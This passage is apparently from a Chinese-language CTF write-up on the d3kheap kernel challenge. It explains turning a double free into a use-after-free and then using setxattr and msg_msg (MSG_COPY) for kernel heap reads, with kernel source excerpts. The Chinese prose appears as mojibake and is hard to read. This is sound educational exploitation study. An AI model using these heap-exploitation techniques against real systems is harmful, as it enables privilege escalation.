printk(KERN_ALERT <span class="string">&quot;[d3kheap:] The buf already free!&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                ref_count--;</span><br><span class="line">                kfree(buf);</span><br><span class="line">                printk(KERN_INFO <span class="string">&quot;[d3kheap:] Free done.\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">                printk(KERN_ALERT <span class="string">&quot;[d3kheap:] Invalid instructions.\n&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    spin_unlock(&amp;spin);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¶‰åŠåˆ°çš„ä¸¤ä¸ªå…¨å±€å˜é‡åˆå§‹å€¼å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *buf = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> ref_count = <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>æ ¹æ® ioctl çš„é€»è¾‘ï¼Œå½“æˆ‘ä»¬åˆ†é…äº†ä¸€ä¸ª object ä¹‹å <strong>ioctl çš„åˆ†é…åŠŸèƒ½å°±æ— æ•ˆäº†</strong>ï¼Œè€Œæ¯å½“æˆ‘ä»¬è¿›è¡Œä¸€æ¬¡é‡Šæ”¾ï¼Œ<code>ref_count</code> ä¾¿ä¼šå‡ä¸€ï¼Œå½“å…¶ä¸º 0 æ—¶ <strong>ioctl çš„é‡Šæ”¾åŠŸèƒ½ä¹Ÿè¢«æ— æ•ˆåŒ–</strong></p><p>æ¼æ´ç‚¹å¾ˆæ˜æ˜¾ï¼Œå¯¹ <code>ref_count</code> çš„é”™è¯¯åˆå§‹åŒ–å¯¼è‡´æˆ‘ä»¬å¯ä»¥é‡Šæ”¾ buf ä¸¤æ¬¡ï¼Œå³è¯¥æ¨¡å—<strong>åªæä¾›ç»™ä½ ä¸‰æ¬¡æ“ä½œæœºä¼šï¼Œä¸€æ¬¡åˆ†é…ï¼Œä¸¤æ¬¡é‡Šæ”¾ï¼Œæˆ‘ä»¬ä¸èƒ½é€šè¿‡æ¼æ´æ¨¡å—å¯¹ buf è¿›è¡Œä»»ä½•é¢å¤–çš„æ“ä½œ</strong>ï¼ˆä¾‹å¦‚è¯»&#x2F;å†™ï¼‰ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯â€”â€”â€œç»™ä½ ä¸€æ¬¡å†…æ ¸ç©ºé—´ä¸­å¤§å°ä¸º 1024 çš„ object çš„ double free çš„æœºä¼šï¼Œä¿æŠ¤å…¨å¼€ï¼Œä½ è¯¥å¦‚ä½•å»åˆ©ç”¨ï¼Ÿâ€</p><h1 id="0x02-æ¼æ´åˆ©ç”¨"><a href="#0x02-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x02.æ¼æ´åˆ©ç”¨"></a>0x02.æ¼æ´åˆ©ç”¨</h1><p>å› ä¸ºåœ¨ slub_free ä¸­æœ‰ç€å¯¹ double free çš„ç®€å•æ£€æŸ¥ï¼ˆç±»ä¼¼äº glibc ä¸­çš„ fastbinï¼Œä¼šæ£€æŸ¥ freelist æŒ‡å‘çš„ç¬¬ä¸€ä¸ª objectï¼‰ï¼Œå› æ­¤æˆ‘ä»¬ä¸èƒ½å¤Ÿç›´æ¥è¿›è¡Œ double freeï¼Œè€Œåº”è¯¥å°†å…¶è½¬åŒ–ä¸º UAF è¿›è¡Œåˆ©ç”¨</p><h2 id="æ„é€ -UAF"><a href="#æ„é€ -UAF" class="headerlink" title="æ„é€  UAF"></a>æ„é€  UAF</h2><p>æˆ‘ä»¬é¦–å…ˆéœ€è¦æ„é€ ä¸€ä¸ª UAFï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°å¦‚ä¸‹åˆ©ç”¨é“¾ï¼š</p><ul><li>åˆ†é…ä¸€ä¸ª 1024 å¤§å°çš„ object</li><li>é‡Šæ”¾è¯¥ object</li><li>å°†å…¶åˆ†é…åˆ°åˆ«çš„ç»“æ„ä½“ï¼ˆvictimï¼‰ä¸Š</li><li>é‡Šæ”¾è¯¥ object</li></ul><p>æ­¤æ—¶ victim è™½ç„¶è¿˜å¤„åœ¨ä½¿ç”¨é˜¶æ®µï¼Œä½†æ˜¯<strong>åœ¨ slub ä¸­å…¶åŒæ—¶ä¹Ÿè¢«è§†ä¸ºä¸€ä¸ª free object</strong>ï¼Œæˆ‘ä»¬æ­¤æ—¶ä¾¿å®Œæˆäº† UAF çš„æ„é€ ï¼Œç”±äº slub éµå¾ª LIFOï¼Œå› æ­¤æ¥ä¸‹æ¥åˆ†é…çš„ç¬¬ä¸€ä¸ªå¤§å°ä¸º 1024 çš„ object <strong>ä¾¿ä¼šæ˜¯ victim</strong></p><p>æ¥ä¸‹æ¥æœ‰ä¸¤ç§è§£æ³•ï¼Œä¸€ç§æ˜¯ç¬”è€…æœ€åˆæƒ³åˆ°çš„æ¯”è¾ƒç¬¨é‡çš„å†…å­˜æœç´¢è§£æ³•ï¼Œå¦ä¸€ç§æ˜¯åŸºäº Google åœ¨ CVE-2021-22555 ä¸­ç»™å‡ºçš„é€šç”¨ UAF è§£æ³•</p><h2 id="è§£æ³•ä¸€ï¼šåˆ©ç”¨-setxattr-å¤šæ¬¡åŠ«æŒ-msg-msg"><a href="#è§£æ³•ä¸€ï¼šåˆ©ç”¨-setxattr-å¤šæ¬¡åŠ«æŒ-msg-msg" class="headerlink" title="è§£æ³•ä¸€ï¼šåˆ©ç”¨ setxattr å¤šæ¬¡åŠ«æŒ msg_msg"></a>è§£æ³•ä¸€ï¼šåˆ©ç”¨ setxattr å¤šæ¬¡åŠ«æŒ msg_msg</h2><h3 id="Step-I-setxattr-ä¿®æ”¹-object-å†…å®¹"><a href="#Step-I-setxattr-ä¿®æ”¹-object-å†…å®¹" class="headerlink" title="Step.I setxattr ä¿®æ”¹ object å†…å®¹"></a>Step.I setxattr ä¿®æ”¹ object å†…å®¹</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ€è€ƒå¦‚ä½•å¯¹ä¸€ä¸ª free çŠ¶æ€çš„ object å†…å†™å…¥æ•°æ®ï¼Œè¿™é‡Œç¬”è€…è¦å‘å¤§å®¶ä»‹ç»ä¸€ä¸ªåä¸º setxattr çš„ç³»ç»Ÿè°ƒç”¨ï¼ˆå¯¹å†…æ ¸å®‰å…¨ç¨æœ‰ç ”ç©¶çš„åŒå­¦åº”è¯¥éƒ½æ¥è§¦è¿‡ï¼‰</p><p>setxattr æ˜¯ä¸€ä¸ªååˆ†ç‹¬ç‰¹çš„ç³»ç»Ÿè°ƒç”¨æ—ï¼ŒæŠ›å¼€å…¶æœ¬èº«çš„åŠŸèƒ½ï¼Œåœ¨ kernel çš„åˆ©ç”¨å½“ä¸­ä»–å¯ä»¥ä¸ºæˆ‘ä»¬æä¾›<strong>è¿‘ä¹ä»»æ„å¤§å°çš„å†…æ ¸ç©ºé—´ object åˆ†é…</strong></p><p>è§‚å¯Ÿ setxattr æºç ï¼Œå‘ç°å¦‚ä¸‹è°ƒç”¨é“¾ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYS_setxattr()</span><br><span class="line">    path_setxattr()</span><br><span class="line">        setxattr()</span><br></pre></td></tr></table></figure><p>åœ¨ <code>setxattr()</code> å‡½æ•°ä¸­æœ‰å¦‚ä¸‹é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span></span><br><span class="line"><span class="title function_">setxattr</span><span class="params">(<span class="keyword">struct</span> dentry *d, <span class="type">const</span> <span class="type">char</span> __user *name, <span class="type">const</span> <span class="type">void</span> __user *value,</span></span><br><span class="line"><span class="params">     <span class="type">size_t</span> size, <span class="type">int</span> flags)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">        kvalue = kvmalloc(size, GFP_KERNEL);</span><br><span class="line">        <span class="keyword">if</span> (!kvalue)</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">        <span class="keyword">if</span> (copy_from_user(kvalue, value, size)) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//,..</span></span><br><span class="line"></span><br><span class="line">    kvfree(kvalue);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ value å’Œ size éƒ½æ˜¯ç”±æˆ‘ä»¬æ¥æŒ‡å®šçš„ï¼Œå³<strong>æˆ‘ä»¬å¯ä»¥åˆ†é…ä»»æ„å¤§å°çš„ object å¹¶å‘å…¶ä¸­å†™å…¥å†…å®¹</strong>ï¼Œå®Œæˆå†™å…¥ä¹‹åè¯¥ object åˆä¼šé€šè¿‡ kvfree è¢«é‡Šæ”¾æ‰ï¼Œå› æ­¤æˆ‘ä»¬ä¾¿å¯ä»¥é€šè¿‡ setxattr <strong>å¤šæ¬¡ä¿®æ”¹ victim çš„å†…å®¹</strong></p><p>ä¸å¤Ÿå®Œç¾çš„ä¸€ç‚¹æ˜¯ï¼Œslub ä¸­ free çš„ object åŒæ ·æ˜¯è¿æ¥æˆä¸€ä¸ªå•å‘é“¾è¡¨ï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•æ§åˆ¶è¯¥ object ä¸­ <code>kmem_cache-&gt;offset</code> åç§»å¤„çš„ 8 å­—èŠ‚çš„å†…å®¹ï¼Œä½†è¿™ä¸ª offset çš„å­˜åœ¨<strong>ä¹Ÿä»å¦ä¸€ä¸ªä¾§é¢æä¾›ç»™äº†æˆ‘ä»¬ä¾¿åˆ©</strong>ï¼Œåœ¨æ¥ä¸‹æ¥çš„åˆ©ç”¨ä¸­ä½ ä¼šçœ‹åˆ°è¿™ä¸€ç‚¹</p><p>å¯èƒ½æœ‰çš„äººè¿˜ä¼šæƒ³åˆ° userfaultfd + setxattr è¿™ä¸€æŠ€æœ¯ï¼Œæˆ–è®¸å¯ä»¥åˆ©ç”¨è¿™ä¸ªæŠ€æœ¯åŠ«æŒ freelist å®Œæˆä»»æ„åœ°å€åˆ†é…ä¸ä»»æ„åœ°å€å†™ï¼Ÿä½†æ˜¯<strong>è‡ªä»å†…æ ¸ç‰ˆæœ¬ 5.11 èµ·ï¼Œuserfaultfd è¢«é™åˆ¶ä¸ºé»˜è®¤æƒ…å†µä¸‹åªæœ‰ root æƒé™æ‰èƒ½ä½¿ç”¨</strong>ï¼Œå› æ­¤è¿™æ¡è·¯æš‚æ—¶æ˜¯èµ°ä¸é€šçš„ï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥è¦æ‰¾ä¸€ä¸ªä¸æ˜¯ç‰¹åˆ«å—åˆ†é…å¤§å°å½±å“çš„ç»“æ„ä½“</p><h3 id="Step-II-msg-msg-æœç´¢å†…å­˜å®Œæˆåœ°å€æ³„éœ²"><a href="#Step-II-msg-msg-æœç´¢å†…å­˜å®Œæˆåœ°å€æ³„éœ²" class="headerlink" title="Step.II msg_msg æœç´¢å†…å­˜å®Œæˆåœ°å€æ³„éœ²"></a>Step.II msg_msg æœç´¢å†…å­˜å®Œæˆåœ°å€æ³„éœ²</h3><p>ç°åœ¨æˆ‘ä»¬æœ‰äº†ã€Œå†™çš„åŸè¯­ã€ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬è¦å¯»æ‰¾ã€Œè¯»çš„åŸè¯­ã€ï¼Œåœ¨ Linux kernel ä¸­æœ‰ç€ä¸€ç»„ system V æ¶ˆæ¯é˜Ÿåˆ—ç›¸å…³çš„ç³»ç»Ÿè°ƒç”¨ï¼š</p><ul><li>msggetï¼šåˆ›å»ºä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—</li><li>msgsndï¼šå‘æŒ‡å®šæ¶ˆæ¯é˜Ÿåˆ—å‘é€æ¶ˆæ¯</li><li>msgrcvï¼šä»æŒ‡å®šæ¶ˆæ¯é˜Ÿåˆ—æ¥æ¥æ”¶æ¶ˆæ¯</li></ul><p>å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—æ—¶ï¼Œåœ¨å†…æ ¸ç©ºé—´ä¸­ä¼šåˆ›å»ºè¿™æ ·ä¸€ä¸ªç»“æ„ä½“ï¼Œå…¶è¡¨ç¤ºä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msq_queue structure for each present queue on the system */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line"><span class="type">time64_t</span> q_stime;<span class="comment">/* last msgsnd time */</span></span><br><span class="line"><span class="type">time64_t</span> q_rtime;<span class="comment">/* last msgrcv time */</span></span><br><span class="line"><span class="type">time64_t</span> q_ctime;<span class="comment">/* last change time */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> q_cbytes;<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> q_qnum;<span class="comment">/* number of messages in queue */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> q_qbytes;<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span><span class="comment">/* pid of last msgsnd */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span><span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>è€Œå½“æˆ‘ä»¬è°ƒç”¨ msgsnd ç³»ç»Ÿè°ƒç”¨åœ¨æŒ‡å®šæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€ä¸€æ¡æŒ‡å®šå¤§å°çš„ message æ—¶ï¼Œåœ¨å†…æ ¸ç©ºé—´ä¸­ä¼šåˆ›å»ºè¿™æ ·ä¸€ä¸ªç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line"><span class="type">long</span> m_type;</span><br><span class="line"><span class="type">size_t</span> m_ts;<span class="comment">/* message text size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> *security;</span><br><span class="line"><span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨å†…æ ¸å½“ä¸­è¿™ä¸¤ä¸ªç»“æ„ä½“å½¢æˆä¸€ä¸ªå¦‚ä¸‹ç»“æ„çš„å¾ªç¯åŒå‘é“¾è¡¨ï¼š</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>è‹¥æ˜¯æ¶ˆæ¯é˜Ÿåˆ—ä¸­åªæœ‰ä¸€ä¸ªæ¶ˆæ¯åˆ™æ˜¯è¿™æ ·ï¼š</p><p><img src="https://s2.loli.net/2022/02/24/sD9xtpaHrQ2uneZ.png" alt="image.png"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬æ¥æ·±å…¥ msg_msg çš„å†…éƒ¨ç»“æ„ï¼Œé˜…è¯» msgsnd æºç å¯çŸ¥ï¼Œå½“æˆ‘ä»¬åœ¨æ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€ä¸€ä¸ª message æ—¶ï¼Œå…¶é¦–å…ˆä¼šè°ƒç”¨ <code>load_msg</code> å°†è¯¥ message æ‹·è´åˆ°å†…æ ¸ä¸­</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_msgsnd</span><span class="params">(<span class="type">int</span> msqid, <span class="type">long</span> mtype, <span class="type">void</span> __user *mtext,</span></span><br><span class="line"><span class="params"><span class="type">size_t</span> msgsz, <span class="type">int</span> msgflg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (msgsz &gt; ns-&gt;msg_ctlmax || (<span class="type">long</span>) msgsz &lt; <span class="number">0</span> || msqid &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (mtype &lt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">msg = load_msg(mtext, msgsz);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>è€Œ <code>load_msg()</code> æœ€ç»ˆä¼šè°ƒç”¨åˆ° <code>alloc_msg()</code> åˆ†é…æ‰€éœ€çš„ç©ºé—´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> msg_msg *<span class="title function_">load_msg</span><span class="params">(<span class="type">const</span> <span class="type">void</span> __user *src, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"><span class="type">int</span> err = -EFAULT;</span><br><span class="line"><span class="type">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">msg = alloc_msg(len);</span><br></pre></td></tr></table></figure><p>é˜…è¯» <code>alloc_msg()</code> æºç å¯ä»¥å‘ç°ï¼Œå…¶ä»¥ msg_msg ç»“æ„ä½“ä¸ºæ ¸å¿ƒç”Ÿæˆå¦‚ä¸‹ç»“æ„ï¼š</p><ul><li>å¯¹äºå¤§å°åœ¨ã€ä¸€ä¸ªé¡µé¢å†å‡æ‰ä½œä¸º header çš„ msg_msg çš„ sizeã€‘èŒƒå›´å†…çš„æ•°æ®è€Œè¨€ï¼Œå†…æ ¸ä»…ä¼šåˆ†é…ä¸€ä¸ª size + header size å¤§å°çš„ objectï¼ˆé€šè¿‡ kmallocï¼‰ï¼Œå…¶å‰ 0x30 å¤§å°çš„éƒ¨åˆ†å­˜æ”¾ msg_msg è¿™ä¸€ headerï¼Œå‰©ä½™éƒ¨åˆ†ç”¨ä»¥å­˜æ”¾ç”¨æˆ·æ•°æ®</li><li>å¯¹äºå¤§å°è¶…å‡ºã€ä¸€ä¸ªé¡µé¢å†å‡æ‰ä½œä¸º header çš„ msg_msg çš„ sizeã€‘èŒƒå›´çš„æ•°æ®è€Œè¨€ï¼Œå…¶ä¼šé¢å¤–ç”Ÿæˆ <code>msg_msgseg</code> ç»“æ„ä½“æ¥å­˜æ”¾ç”¨æˆ·æ•°æ®ï¼Œé€šè¿‡ kmalloc åˆ†é…ï¼Œå¤§å°ä¸ºå‰©ä½™æœªæ‹·è´çš„ç”¨æˆ·æ•°æ®å¤§å°åŠ ä¸Š next æŒ‡é’ˆï¼›è¯¥ç»“æ„ä½“ä¸ msg_msg çš„ next æˆå‘˜å½¢æˆä¸€ä¸ª<strong>å•å‘é“¾è¡¨</strong>ï¼Œå…¶å‰ 8 å­—èŠ‚å­˜æ”¾æŒ‡å‘ä¸‹ä¸€ä¸ª msg_msgseg çš„æŒ‡é’ˆï¼Œè‹¥æ— åˆ™ä¸º NULL</li></ul><p><img src="https://s2.loli.net/2022/02/24/5IcVxRaFQtg3HCW.png" alt="image.png"></p><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥åˆ†é…ä¸€ä¸ªå¤§å°ä¸º 1024 çš„ msg_msg ç»“æ„ä½“ä½œä¸º victimï¼Œåˆ©ç”¨ setxattr ç³»ç»Ÿè°ƒç”¨ä¿®æ”¹å…¶ header ä¸­çš„ <code>m_ts</code> æˆå‘˜ï¼Œ<strong>ä»è€Œå®ç°å †ä¸Šçš„è¶Šç•Œæ•°æ®è¯»å–</strong>ï¼ŒåŒæ—¶è¿˜èƒ½é€šè¿‡ä¿®æ”¹ msg_msg-&gt;next <strong>å®ç°ä»»æ„åœ°å€è¯»</strong></p><p>ä½†æ˜¯è¿™æ ·æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå½“æˆ‘ä»¬è°ƒç”¨ msgrcv æ¥å—æ¶ˆæ¯æ—¶ï¼Œå…¶ä¼šè°ƒç”¨ <code>list_del()</code> å°†å¯¹åº”çš„ msg_msg ç»“æ„ä½“ä»åŒå‘é“¾è¡¨ä¸­ unlinkï¼Œ<strong>æ­¤æ—¶æˆ‘ä»¬å¹¶ä¸çŸ¥é“å†…æ ¸ç©ºé—´ä¸­çš„ä»»ä½•åœ°å€ï¼Œå› æ­¤å†…æ ¸ä¼šåœ¨ unlink æ—¶ panic æ‰</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_msgrcv</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> __user *buf, <span class="type">size_t</span> bufsz, <span class="type">long</span> msgtyp, <span class="type">int</span> msgflg,</span></span><br><span class="line"><span class="params">       <span class="type">long</span> (*msg_handler)(<span class="type">void</span> __user *, <span class="keyword">struct</span> msg_msg *, <span class="type">size_t</span>))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    list_del(&amp;msg-&gt;m_list);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">goto</span> out_unlock0;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">out_unlock0:</span><br><span class="line">ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">free_copy(copy);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">free_msg(msg);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> bufsz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å› æ­¤æˆ‘ä»¬éœ€è¦æƒ³ä¸€ä¸ªæ–¹æ³•æ—¢èƒ½è¯»å‡º msg_msg ä¸­æ•°æ®åˆä¸ä¼šè®©å…¶è¢«éæ³• unlink æ‰ï¼Œé˜…è¯»æºç æˆ‘ä»¬ä¼šå‘ç°ï¼Œå½“æˆ‘ä»¬åœ¨è°ƒç”¨ msgrcv æ—¶è‹¥è®¾ç½®äº† <code>MSG_COPY</code> æ ‡å¿—ä½ï¼Œåˆ™<strong>å†…æ ¸ä¼šå°† message æ‹·è´ä¸€ä»½åå†æ‹·è´åˆ°ç”¨æˆ·ç©ºé—´ï¼ŒåŸåŒå‘é“¾è¡¨ä¸­çš„ message å¹¶ä¸ä¼šè¢« unlink</strong>ï¼Œä»è€Œæˆ‘ä»¬ä¾¿å¯ä»¥å¤šæ¬¡é‡å¤åœ°è¯»å–åŒä¸€ä¸ª <code>msg_msg</code> ç»“æ„ä½“ä¸­æ•°æ®</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line"><span class="keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">copy = prepare_copy(buf, <span class="type">min_t</span>(<span class="type">size_t</span>, bufsz, ns-&gt;msg_ctlmax));</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(copy))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(copy);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment"> * not update queue parameters.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">msg = copy_msg(msg, copy);</span><br><span class="line"><span class="keyword">goto</span> out_unlock0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘è¶Šç•Œè¯»å–çš„è¯¦ç»†è¿‡ç¨‹ï¼Œæˆ‘ä»¬é¦–å…ˆå¯ä»¥åˆ©ç”¨ setxattr ä¿®æ”¹ msg_msg çš„ <code>next</code> æŒ‡é’ˆä¸º NULLã€å°†å…¶ <code>m_ts</code> æ”¹ä¸º <code>0x1000 - 0x30</code>ï¼ˆåœ¨ next æŒ‡é’ˆä¸º NULL çš„æƒ…å†µä¸‹ï¼Œä¸€ä¸ª msg_msg ç»“æ„ä½“æœ€å¤§å ç”¨ä¸€å¼ 